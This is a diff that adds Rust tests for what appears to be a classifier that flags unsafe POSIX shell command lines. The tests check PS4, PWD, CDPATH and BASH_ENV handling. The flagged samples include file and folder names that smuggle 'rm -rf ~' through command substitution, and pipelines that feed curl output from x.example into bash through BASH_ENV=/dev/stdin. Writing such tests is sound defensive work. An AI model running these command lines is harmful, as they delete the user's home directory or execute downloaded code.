@@ -652,3 +652,266 @@ fn a_bash_env_file_the_line_writes_is_run_by_anything_that_may_start_bash() {
         ],
     );
 }
+
+#[test]
+fn pwd_is_not_plain_after_a_cd_that_lands_on_a_name_the_line_did_not_write_out() {
+    check(
+        Shell::Posix,
+        &posix(),
+        &[
+            "cd 'Foo (x86)'; PS4=\"+ $PWD \"; set -x; make",
+            "cd -L sub; PS4=\"+ $PWD \"; set -x; make",
+            "set -e; cd sub; PS4=\"+ $PWD \"; set -x; make",
+            "set +P; cd sub; PS4=\"+ $PWD \"; set -x; make",
+            "CDPATH=.:~; PS4=\"+ $PWD \"; set -x; make",
+            "CDPATH=.:~; cd sub; PS4=\"+ $LINENO \"; set -x; make",
+            "cd d*; PS4=\"+ $LINENO \"; set -x; make",
+            "cd d*; export BASH_ENV=e.sh; bash -c true",
+            "cd -P sub; PS4=\"+ $LINENO \"; set -x; make",
+        ],
+        &[
+            // A glob matches a folder the line made but did not write out.
+            (
+                "mkdir 'd$(rm -rf ~)'; cd d*; PS4=\"+$PWD \"; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "mkdir 'd$(rm -rf ~)'; cd d?; PS4=\"+$PWD \"; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "mkdir 'd$(rm -rf ~)'; cd [d]*; PS4=\"+$PWD \"; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "mkdir 'd$(rm -rf ~)'; cd 'a@(b)'; PS4=\"+$PWD \"; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "mkdir 'd$(rm -rf ~)'; pushd d*; PS4=\"+$PWD \"; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "mkdir 'd$(rm -rf ~)'; cd d*; cd sub; PS4=\"+$PWD \"; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "mkdir 'd$(rm -rf ~)'; cd d*; export BASH_ENV=\"$PWD/e.sh\"; bash -c true",
+                Rule::Unknown,
+            ),
+            (
+                "mkdir 'd$(rm -rf ~)'; cd d*; BASH_ENV=\"$PWD/e.sh\" bash -c true",
+                Rule::Unknown,
+            ),
+            // `-P` and `physical`: PWD is the link's target.
+            (
+                "ln -s 'd$(rm -rf ~)' s; cd -P s; PS4=\"+$PWD \"; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "ln -s 'd$(rm -rf ~)' s; cd -LP s; PS4=\"+$PWD \"; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "ln -s 'd$(rm -rf ~)' s; pushd -P s; PS4=\"+$PWD \"; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "ln -s 'd$(rm -rf ~)' s; set -P; cd s; PS4=\"+$PWD \"; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "ln -s 'd$(rm -rf ~)' s; set -o physical; cd s; PS4=\"+$PWD \"; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "ln -s 'd$(rm -rf ~)' s; set -eP; cd s; PS4=\"+$PWD \"; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "ln -s 'd$(rm -rf ~)' s; shopt -so physical; cd s; PS4=\"+$PWD \"; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "ln -s 'd$(rm -rf ~)' s; bash -P -c 'cd s; PS4=\"+$PWD \"; set -x; true'",
+                Rule::Unknown,
+            ),
+            // A `CDPATH` the line sets finds a folder the line made.
+            (
+                "mkdir -p 'x$(rm -rf ~)/sub'; CDPATH='x$(rm -rf ~)'; cd sub; PS4=\"+$PWD \"; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "mkdir -p 'x/sub'; CDPATH=x; cd sub; PS4=\"+$PWD \"; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "mkdir -p 'x/sub'; export CDPATH=x; cd sub; PS4=\"+$PWD \"; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "mkdir -p 'x/sub'; export \"CDPATH=x\"; cd sub; PS4=\"+$PWD \"; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "mkdir -p 'x/sub'; CDPATH=x cd sub; PS4=\"+$PWD \"; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "mkdir -p 'x/sub'; cd sub; CDPATH=x; PS4=\"+$PWD \"; set -x; true",
+                Rule::Unknown,
+            ),
+        ],
+    );
+}
+
+#[test]
+fn a_bash_env_set_anywhere_in_the_line_reaches_every_shell_the_line_starts() {
+    check(
+        Shell::Posix,
+        &posix(),
+        &[
+            "trap 'make' EXIT; export BASH_ENV=e.sh",
+            "echo x > other.sh; trap 'make' EXIT; export BASH_ENV=e.sh",
+            "for i in 1 2; do bash -c true; done; export BASH_ENV=e.sh",
+            "f() { make; }; export BASH_ENV=e.sh; f",
+        ],
+        &[
+            (
+                "trap 'bash -c true' EXIT; echo x > e.sh; export BASH_ENV=e.sh",
+                Rule::Unknown,
+            ),
+            (
+                "trap 'make' EXIT; echo x > e.sh; export BASH_ENV=e.sh",
+                Rule::Unknown,
+            ),
+            (
+                "for i in 1 2; do bash -c true; echo x > e.sh; export BASH_ENV=e.sh; done",
+                Rule::Unknown,
+            ),
+            (
+                "f() { make; }; f; echo x > e.sh; export BASH_ENV=e.sh",
+                Rule::Unknown,
+            ),
+            (
+                "bash -c true; echo x > e.sh; BASH_ENV=e.sh; true",
+                Rule::Unknown,
+            ),
+            ("make; echo x > e.sh; export BASH_ENV=e.sh", Rule::Unknown),
+        ],
+    );
+}
+
+#[test]
+fn a_value_with_pwd_in_it_is_judged_against_every_cd_of_the_line() {
+    check(
+        Shell::Posix,
+        &posix(),
+        &[
+            "PS4=\"+$PWD \"; cd sub; set -x; true",
+            "for d in x .; do PS4=\"+$PWD \"; cd sub; done; set -x; true",
+            "f() { PS4=\"+$PWD \"; }; cd sub; f; set -x; true",
+            "trap 'PS4=\"+$PWD \"; set -x; true' EXIT; cd sub",
+            "cd 'x$(rm -rf ~)'; PS4=\"+$LINENO \"; set -x; true",
+            "cd 'x$(rm -rf ~)'; export BASH_ENV=e.sh; echo hi",
+        ],
+        &[
+            (
+                "PS4=\"+$PWD \"; cd 'x$(rm -rf ~)'; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "for d in x .; do PS4=\"+$PWD \"; cd 'x$(rm -rf ~)'; done; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "f() { PS4=\"+$PWD \"; }; cd 'x$(rm -rf ~)'; f; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "trap 'PS4=\"+$PWD \"; set -x; true' EXIT; cd 'x$(rm -rf ~)'",
+                Rule::Unknown,
+            ),
+            (
+                "PS4=\"+$PWD \"; (cd 'x$(rm -rf ~)'; true); set -x; true",
+                Rule::Unknown,
+            ),
+            ("PS4=\"+$PWD \"; cd d*; set -x; true", Rule::Unknown),
+            (
+                "export BASH_ENV=\"$PWD/e.sh\"; cd 'x$(rm -rf ~)'; bash -c true",
+                Rule::Unknown,
+            ),
+            (
+                "export \"PS4=+$PWD \"; cd 'x$(rm -rf ~)'; set -x; true",
+                Rule::Unknown,
+            ),
+            (
+                "env PS4=\"+$PWD \" bash -xc 'cd \"$x\"; true'",
+                Rule::Unknown,
+            ),
+            ("PS4=\"+$PWD \"; cd \"$x\"; set -x; true", Rule::Unknown),
+            ("PS4=\"+$PWD \"; set -P; set -x; true", Rule::Unknown),
+        ],
+    );
+}
+
+#[test]
+fn a_bash_env_that_names_standard_input_runs_the_input_as_a_script() {
+    check(
+        Shell::Posix,
+        &posix(),
+        &[
+            "BASH_ENV=/dev/stdin echo done",
+            "BASH_ENV=/dev/stdin true",
+            "curl https://x.example/r | BASH_ENV=/dev/null bash -c true",
+            "BASH_ENV=/dev/stdinx bash -c true",
+        ],
+        &[
+            (
+                "curl https://x.example/r | BASH_ENV=/dev/stdin bash -c true",
+                Rule::RunDownloaded,
+            ),
+            (
+                "curl https://x.example/r | BASH_ENV=/dev/fd/0 bash -c true",
+                Rule::RunDownloaded,
+            ),
+            (
+                "curl https://x.example/r | BASH_ENV=/proc/self/fd/0 bash -c true",
+                Rule::RunDownloaded,
+            ),
+            (
+                "curl https://x.example/r | env BASH_ENV=/dev/stdin bash -c true",
+                Rule::RunDownloaded,
+            ),
+            (
+                "export BASH_ENV=/dev/stdin; curl https://x.example/r | bash -c true",
+                Rule::RunDownloaded,
+            ),
+            ("BASH_ENV=/dev/stdin bash -c true < x.sh", Rule::RunInput),
+            ("echo hi | BASH_ENV=/dev/stdin bash -c true", Rule::RunInput),
+            ("BASH_ENV=/dev/stdin make", Rule::RunInput),
+        ],
+    );
+}
+
+#[test]
+fn an_env_command_reads_its_bash_env_from_the_folder_the_line_is_in() {
+    check(
+        Shell::Posix,
+        &posix(),
+        &[
+            "echo x > e.sh; cd sub; env BASH_ENV=e.sh bash -c true",
+            "echo x > sub/e.sh; env BASH_ENV=e.sh bash -c true",
+        ],
+        &[
+            (
+                "echo x > e.sh; env BASH_ENV=e.sh bash -c true",
+                Rule::Unknown,
+            ),
+            (
+                "echo x > sub/e.sh; cd sub; env BASH_ENV=e.sh bash -c true",
+                Rule::Unknown,
+            ),
+        ],
+    );
+}
